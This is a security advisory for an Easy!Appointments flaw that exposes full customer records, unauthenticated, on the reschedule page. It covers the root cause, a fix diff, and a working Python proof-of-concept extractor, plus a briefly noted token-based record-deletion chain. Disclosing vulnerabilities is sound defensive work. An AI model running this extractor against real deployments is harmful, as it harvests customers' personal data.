# [M] Easy!Appointments has unauthenticated customer PII disclosure on booking reschedule page

## Summary
Severity: Medium
Advisory: GHSA-xgr6-pqjv-3pf8
CVE: CVE-2026-52837
CWE: CWE-200, CWE-639
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-29
Source: https://github.com/advisories/GHSA-xgr6-pqjv-3pf8
Type: github-advisory

## Affected
- Packagist: `alextselegidis/easyappointments` — affected >=0

## Details
## Summary

The booking reschedule view at `/index.php/booking/reschedule/{appointment_hash}` (handled by `Booking::index()`) embeds the **entire customer record** as inline JavaScript (`const vars = {... "customer_data": {...}, ...}`) without authentication and without field whitelisting. Anyone in possession of the 12-character `appointment_hash` — which appears in plain text in reschedule emails, confirmation page URLs, and operator-side calendar links — can read every column of that customer's row in the `ea_users` table.

Verified against v1.5.2 with a Docker reproduction; a single anonymous GET to the reschedule URL returns 13 customer fields including email, phone, full address, custom fields, timezone, language, LDAP DN, and `id_roles`.

## Details

### Root cause

`application/controllers/Booking.php` at line 184 reads the hash from the request, fetches the appointment, then loads the customer with `Customers_model::find()` — which returns the full row, no projection. It then passes the full record into `script_vars()`, which inlines it into the response HTML as a JavaScript constant. The reschedule UI itself uses only `first_name` and `last_name`; everything else is exposed for no functional reason.

```php
// application/controllers/Booking.php (v1.5.2)
$appointment_hash = html_vars('appointment_hash');         // line 184
if (!empty($appointment_hash)) {
    $manage_mode = true;
    $results = $this->appointments_model->get(['hash' => $appointment_hash]);
    // ...
    $appointment = $results[0];
    $provider = $this->providers_model->find($appointment['id_users_provider']);
    $customer = $this->customers_model->find($appointment['id_users_customer']);  // ← full row, no projection
    $customer_token = md5(uniqid(mt_rand(), true));
    $this->cache->save('customer-token-' . $customer_token, $customer['id'], 600);
}

script_vars([
    // ...
    'customer_data' => $customer,                          // ← all PII inlined in HTML
    'customer_token' => $customer_token,
]);
```

The URL pattern is in the CSRF exemption list (`application/config/config.php`, `csrf_exclude_uris` covers `booking/.*`) and no authentication middleware applies, by design — that's the intended customer-facing reschedule flow. The bug is the over-disclosure, not the lack of auth.

### Source-to-Sink

- **Source**: HTTP GET to `/index.php/booking/reschedule/{appointment_hash}` — unauthenticated; hash read via `html_vars('appointment_hash')` (Booking.php:184).
- **Intermediate**: `appointments_model->get(['hash' => $hash])` → row fetched; `customers_model->find($appointment['id_users_customer'])` returns the full customers row.
- **Sink**: `script_vars(['customer_data' => $customer, ...])` (Booking.php:254-270) emits inline `const vars = {..., "customer_data": {...}, ...}` JavaScript in the response HTML.

### Fields disclosed

Confirmed in PoC output (canary values used as markers):

```
customer_data: {
  "id": 4,
  "first_name": "Victim",
  "last_name": "Tester",
  "email": "victim.disclosure@example.invalid",
  "phone_number": "+1-555-0100",
  "address": "100 Privacy Lane",
  "city": "Sensitiveville",
  "zip_code": "00001",
  "timezone": "UTC",
  "language": "english",
  "custom_field_1": "CFLD1-CANARY",
  "is_private": "0",
  "ldap_dn": null,
  "id_roles": 3
}
```

Fields that would also leak when populated: `mobile_number`, `state`, `notes` (free-form, operators often store sensitive context here), `custom_field_2`–`custom_field_5`, `ldap_dn`.

## Proof of Concept

```python
#!/usr/bin/env python3
# poc_001_easyapp_pii_disclosure.py — exploit mode (extract from attached PoC)
import argparse, json, re, sys, requests

PII_FIELDS = ["email","phone_number","mobile_number","address","city","state",
              "zip_code","notes","custom_field_1","custom_field_2","custom_field_3",
              "custom_field_4","custom_field_5","ldap_dn"]

def exploit(target, hash_):
    url = f"{target}/index.php/booking/reschedule/{hash_}"
    r = requests.get(url, timeout=15); r.raise_for_status()
    m = re.search(r"const\s+vars\s*=\s*(\{.*?\});", r.text, re.DOTALL)
    ea = json.loads(m.group(1))
    customer = ea.get("customer_data") or {}
    leaked = 0
    for f in PII_FIELDS:
        if customer.get(f) not in (None, "", 0):
            print(f"  {f:18s} = {customer[f]!r}"); leaked += 1
    print(f"[+] disclosed {leaked} PII fields without auth")
    return leaked

if __name__ == "__main__":
    p = argparse.ArgumentParser()
    p.add_argument("--target", default="http://localhost:8000")
    p.add_argument("--hash", required=True)
    a = p.parse_args()
    sys.exit(0 if exploit(a.target, a.hash) > 0 else 1)
```

### Reproduction

1. Bring up the lab from the project's official `docker-compose.yml` (pinned to v1.5.2). Complete the one-time install at `/index.php/installation` (or `php index.php console install` from the php-fpm container).
2. Book one appointment through the public flow (the bundled `--seed` helper does this automatically and prints the resulting hash).
3. Run the unauthenticated extractor:
   ```
   python3 poc_001_easyapp_pii_disclosure.py --target http://localhost:8000 --hash <HASH>
   ```
4. Observed output (verified 5/5 consecutive runs):
   ```
   email              = 'victim.disclosure@example.invalid'
   phone_number       = '+1-555-0100'
   address            = '100 Privacy Lane'
   city               = 'Sensitiveville'
   zip_code           = '00001'
   custom_field_1     = 'CFLD1-CANARY'
   [+] DISCLOSURE CONFIRMED -- 6 PII field(s) accessible without auth.
   ```

The PoC and its docker-compose reproduction environment are attached.

## Impact

A single anonymous GET request returns the customer's full record. The `appointment_hash` is not a secret to the customer — it appears in every reschedule email, every confirmation page URL, and the operator-side calendar reschedule link. So it leaks through the usual side channels: email forwarding, shared inboxes, mail-server logs, browser history, HTTP `Referer` headers when the customer clicks an outbound link from the reschedule page.

For a typical Easy!Appointments deployment (medical clinics, salons, legal/tutoring consultancies, hairdressers) the disclosed fields include regulated personal information — GDPR Article 5(1)(f) / Article 32 confidentiality, HIPAA contact-data exposure, and equivalent regional regimes. The free-form `notes` and the five configurable custom fields are frequently used by operators to store sensitive supplementary data (health context, insurance number, allergies, DOB, government ID).

A secondary chain worth flagging: the same response emits `customer_token`, a 600-second cache key bound to the customer ID. If `display_delete_personal_information` is enabled, an attacker holding the hash can also trigger a customer-record deletion at `/privacy/delete_personal_information` using the disclosed token — escalating an information-disclosure issue into a destructive one. Treating that as a secondary concern, out of scope for this report.

## Workarounds

Operators can mitigate temporarily by:
1. Disabling the reschedule link in confirmation emails (in `Booking_settings`/`Email_settings` templates), forcing customers to re-book instead.
2. Disabling the public booking page entirely (`disable_booking` setting) for deployments that can tolerate it.

Neither workaround removes the root cause; an attacker who already holds a hash can still extract.

## Suggested fix

Whitelist customer fields before inlining. The reschedule UI only needs first/last name:

```diff
--- a/application/controllers/Booking.php
+++ b/application/controllers/Booking.php
@@ -239,7 +239,12 @@ class Booking extends EA_Controller
             $appointment = $results[0];
             $provider = $this->providers_model->find($appointment['id_users_provider']);
-            $customer = $this->customers_model->find($appointment['id_users_customer']);
+            $customer_record = $this->customers_model->find($appointment['id_users_customer']);
+            $customer = [
+                'id'         => $customer_record['id'],
+                'first_name' => $customer_record['first_name'],
+                'last_name'  => $customer_record['last_name'],
+            ];
             $customer_token = md5(uniqid(mt_rand(), true));
```

The same pattern likely needs auditing in `Booking_confirmation::of()` and `Booking_cancellation::of()` — anywhere the customer record is loaded and inlined into a publicly-reachable view.

## Credits

- Discovered through source-code audit by peoplstar

## References

- `application/controllers/Booking.php` lines 184-270 (v1.5.2)
- `application/models/Customers_model.php::find` — returns the full row, no projection
- `application/config/config.php` `csrf_exclude_uris` — whitelisting `booking/.*`
- Related prior PR #1753 (permission checks on appointment search) — same project, adjacent code, vendor previously accepted this class of issue.



[docker-compose.yml](https://github.com/user-attachments/files/27761710/docker-compose.yml)
[easyapp_pii_disclosure.py](https://github.com/user-attachments/files/27761711/easyapp_pii_disclosure.py)
[requirements.txt](https://github.com/user-attachments/files/27761712/requirements.txt)
[consistency_test.txt](https://github.com/user-attachments/files/27761722/consistency_test.txt)
[leaked_customer_data.txt](https://github.com/user-attachments/files/27761723/leaked_customer_data.txt)

## References
- https://github.com/alextselegidis/easyappointments/security/advisories/GHSA-xgr6-pqjv-3pf8
- https://nvd.nist.gov/vuln/detail/CVE-2026-52837
- https://github.com/alextselegidis/easyappointments/commit/40bb0b31b531540bc9006efce4220eb0a437ed2b
- https://github.com/alextselegidis/easyappointments
- https://github.com/alextselegidis/easyappointments/releases/tag/1.6.0
